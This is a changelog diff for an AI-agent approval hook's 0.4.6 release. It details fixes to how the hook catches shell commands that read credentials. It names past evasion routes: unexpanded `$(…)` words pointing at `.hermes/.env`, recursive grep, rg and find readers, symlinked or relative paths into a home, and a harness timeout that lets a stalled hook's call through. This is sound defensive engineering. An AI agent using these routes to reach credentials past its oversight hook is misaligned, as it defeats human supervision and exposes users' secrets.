+- **Security (cred-asymmetry): an unresolved read word under the Hermes
+  hook.** The `$(…)` sentinel left a read word the disk pass could not expand,
+  and the pass returned with no class, so a git reader (exempt from the text
+  credential rule) of `$(…)/.hermes/.env` read as `read.shell`. Such a word is
+  now judged by what it spells, and `account.credential` when it could name a
+  credential. A RECURSIVE reader (`grep`, `rg`, `find`, `tar`, `du`, a copy,
+  move or sync source) of an unresolved word is `account.credential` outright,
+  because the word may land on or above a home, a profile home or an approval
+  home; so is a recursive reader of a pattern the hook cannot expand, and one
+  whose pattern matches a directory holding credentials. Round 3 (review-b's
+  read at 05eb9720): the unresolved-word judge now drops `.` and resolves
+  `..` before it looks for a literal home, counts a home's (or a profile
+  home's) `hermes-agent/` as one, and treats two unknown segments in a row at
+  the end as a possible credential; it also lands the word's literal prefix
+  from each working directory, so a relative, `cd`'d or symlinked prefix into
+  a home is judged where it lands. Bash's `~+` is read as the working
+  directory, and `~-`, the directory-stack forms and `~name` as unknown. A
+  recursive reader that names no path (`grep -r P`, `rg P`, `find -type f`)
+  has its working directory judged as the operand. Cost: `grep`, `rg` and
+  `find` count as recursive whatever their flags, so any operand of theirs
+  holding a `$` (a variable pattern, a `$` regex anchor, single-quoted or not,
+  in a single-file search too) now goes to a person, and so does a single-file
+  read ending in two unexpanded segments (`cat "$DIR/$F"`). Only ever stricter.
+  Since the merge of APRV-522 (#653), every unexpanded tilde prefix, `~+`
+  included, fails closed instead. Fix round 4 (review-b's read at 305d7c3c):
+  the unresolved-word judge also reads a `..` right after an unexpanded
+  segment as cancelling it, which is its own one-segment model, so a round
+  trip through a span back to a home's `profiles/` is judged where it lands;
+  the walk test reads a short option it does not know (and ripgrep's
+  one-letter maximum-depth option) as taking the next word, as it already
+  read an unknown long option; and a pattern in the `hermes-agent/` or
+  `profiles/` directory component under a home, before a credential, is a
+  credential read where the hook cannot list the home. Only ever stricter.
+  Fix round 5 (review-b's read at cbeaf709, M1): that pattern test judges
+  each combination of directory patterns once, in a loop, where round 4
+  recursed with no bound (work factorial in the count of such patterns, and
+  a hook stopped by its harness's timeout lets the call through on Claude
+  Code); a word with more than four such patterns is a credential read
+  without being judged, so it fails closed.
+- **Conformance.** `command-class` 1.9.0 (one hundred and forty new
+  vectors, thirty-two of them unmoved controls; no existing vector
+  expectation moved, 0.4.4's 1.7.0 set and APRV-517's 1.8.0 `push-*` set
+  included; one 0.4.4 test row, `TZ="$(cat .tz)" date`, tightened, see the
+  rebase bullet). Totals 896/896.
+  SPEC.md §5.2's organ list amended, pending sign-off.
+
+### Upgrade order
+
+- **Agent Village:** publish 0.4.6 and read its integrity back, then the
+  control plane pins `APPROVAL_MD_VERSION=0.4.6` and its
+  `APPROVAL_MD_INTEGRITY`, then one update per box. A box still on 0.4.5 keeps
+  the 0.4.5 holes and the old Telegram copy. Only after every box is on 0.4.6
+  may a policy there carry an `exec` block; without one, `exec.code` stays
+  closed. The checkpoint rebake follows later and is not on the critical path.
 
 ## 0.4.5 — 2026-10-17
 
